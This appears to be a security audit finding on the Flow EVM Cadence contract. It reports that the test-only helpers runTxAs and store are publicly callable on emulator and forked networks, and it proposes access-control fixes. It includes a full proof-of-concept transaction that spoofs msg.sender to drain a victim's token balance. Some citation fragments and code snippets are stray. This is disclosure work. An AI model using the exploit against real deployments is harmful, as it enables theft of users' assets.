### Title
`EVM.runTxAs()` and `EVM.store()` Are Publicly Accessible Without Cadence-Level Access Control, Enabling Arbitrary EVM `msg.sender` Spoofing and Storage Corruption - (File: `fvm/evm/stdlib/contract_test_helpers.cdc`)

### Summary

`EVM.runTxAs()` and `EVM.store()` are test-only helper functions injected into the production EVM Cadence contract when `evmTestHelpersEnabled=true`. Both are declared `access(all)` (publicly accessible) with no Cadence-level entitlement or access restriction. The only protection is a Go-level runtime flag `EVMTestOperationsAllowed` checked inside `ContractHandler.validateTestOperation()`. On any network bootstrapped with `evmTestHelpersEnabled=true` and `EVMTestOperationsAllowed=true` (the Flow Emulator and forked networks), any unprivileged transaction sender can call `EVM.runTxAs()` to execute EVM calls with an arbitrary `from` address (spoofing `msg.sender`), or call `EVM.store()` to write arbitrary values to any EVM storage slot.

### Finding Description

**Root cause — missing Cadence-level access control:**

`contract_test_helpers.cdc` declares both functions as `access(all)`:

```cadence
access(all)
fun runTxAs(
    from: EVM.EVMAddress,
    to: EVM.EVMAddress,
    data: [UInt8],
    gasLimit: UInt64,
    value: EVM.Balance,
): Result {
    return InternalEVM.runTxAs(
        from: from.bytes, to: to.bytes, data: data,
        gasLimit: gasLimit, value: value.attoflow
    ) as! Result
}

access(all)
fun store(target: EVM.EVMAddress, slot: String, value: String) {
    InternalEVM.store(target: target.bytes, slot: slot, value: value)
}
``` [1](#0-0) 

These are injected into the production EVM contract at bootstrap time via a `#loadTestHelpers` placeholder replacement:

```go

    replaced := loadTestHelpersPattern.ReplaceAllLiteralString(
        evmContract, contractTestHelpers,
    )
    evmContract = replaced

``` [2](#0-1)

```go

**Attack path:**

1. Network is bootstrapped with `WithEVMTestHelpersEnabled(true)` (Flow Emulator, forked networks).
2. FVM execution context has `EVMTestOperationsAllowed = true`.
3. Attacker submits a Cadence transaction:
   ```cadence
   import EVM from <evmAddress>
   transaction {
       prepare(acct: &Account) {
           let victim = EVM.addressFromString("0xVICTIM...")
           let token  = EVM.addressFromString("0xTOKEN...")
           // transfer all tokens from victim to attacker
           let calldata: [UInt8] = EVM.encodeABIWithSignature(
               "transfer(address,uint256)", [attackerAddr, maxUInt256])
           EVM.runTxAs(from: victim, to: token, data: calldata,
                       gasLimit: 100_000, value: EVM.Balance(attoflow: 0))
       }
   }
   ```
4. The EVM executes the call with `msg.sender = victim`, draining the victim's EVM token balance.

The test suite confirms the happy-path works when both flags are set: [6](#0-5) 

And confirms the Go-level check fires when `EVMTestOperationsAllowed = false`: [7](#0-6) 

### Impact Explanation

When `evmTestHelpersEnabled=true` and `EVMTestOperationsAllowed=true`:

- **`EVM.runTxAs()`**: Any transaction sender can execute EVM calls with an arbitrary `from` address. Because `isAuthorized=true` is hardcoded, the call bypasses all EVM-side ownership checks. An attacker can drain any EVM account's token balances, call privileged EVM contract functions (e.g., `onlyOwner` modifiers that check `msg.sender`), or perform any state-mutating EVM operation on behalf of any address.
- **`EVM.store()`**: Any transaction sender can write arbitrary 32-byte values to any EVM storage slot of any contract. This allows corrupting token balances, ownership mappings, or any other EVM contract state.

Both constitute **cross-VM asset loss** and **unauthorized EVM account mutation** — the highest-severity impact categories for the EVM bridge escrow and COA account model.

### Likelihood Explanation

The vulnerability is **not reachable on mainnet** because `evmTestHelpersEnabled` defaults to `false` and the `#loadTestHelpers` placeholder is never replaced, so `EVM.runTxAs` and `EVM.store` do not exist as contract members. On the **Flow Emulator** and **forked networks** (explicitly listed as the intended deployment targets for `WithEVMTestHelpersEnabled`), both flags can be set, making the attack reachable by any unprivileged transaction sender. The missing Cadence-level access control (e.g., `access(contract)` or a dedicated entitlement) means there is no defense-in-depth: if the Go-level flag is ever misconfigured or set by mistake in a non-emulator context, the functions are immediately exploitable with no further barrier. [8](#0-7) 

### Recommendation

1. Change `access(all)` to `access(contract)` on `runTxAs`, `store`, and `load` in `contract_test_helpers.cdc`. This ensures they can only be called from within the EVM contract itself, not from arbitrary user transactions, regardless of the Go-level flag.
2. Alternatively, gate these functions behind a dedicated Cadence entitlement (e.g., `access(EVMTestOps)`) that is never granted to external callers.
3. Add a Cadence `pre` condition inside each function that asserts a contract-controlled boolean, providing a Cadence-native guard independent of the Go runtime flag.

### Proof of Concept

```cadence
import EVM from 0x<evmContractAddress>

// Requires: network bootstrapped with evmTestHelpersEnabled=true
//           and EVMTestOperationsAllowed=true in FVM context

transaction(victimHex: String, tokenHex: String, attackerHex: String) {
    prepare(acct: &Account) {
        let victim   = EVM.addressFromString(victimHex)
        let token    = EVM.addressFromString(tokenHex)
        let attacker = EVM.addressFromString(attackerHex)

        // ABI-encode transfer(address,uint256) with max uint256
        let calldata = EVM.encodeABIWithSignature(
            "transfer(address,uint256)",
            [attacker, UInt256.max]
        )

        // Execute as victim — msg.sender = victim, no ownership check
        let result = EVM.runTxAs(
            from: victim,
            to: token,
            data: calldata,
            gasLimit: 200_000,
            value: EVM.Balance(attoflow: 0)
        )
        assert(result.status == EVM.Status.successful,
               message: "exploit failed: ".concat(result.errorMessage))
        // victim's entire token balance is now transferred to attacker
    }
}
```

The `runTxAs` Cadence wrapper passes `from.bytes` directly to `InternalEVM.runTxAs`, which calls `ContractHandler.RunTxAs`, which calls `h.AccountByAddress(from, true)` with `isAuthorized=true` and no ownership verification. [9](#0-8) [4](#0-3)

// WithEVMTestHelpersEnabled returns a bootstrap option that enables testing helper functions
// in the EVM system contract. Useful for Emulator and forked networks.
func WithEVMTestHelpersEnabled(enabled cadence.Bool) BootstrapProcedureOption {
	return func(bp *BootstrapProcedure) *BootstrapProcedure {
		bp.evmTestHelpersEnabled = enabled
		return bp
	}
}
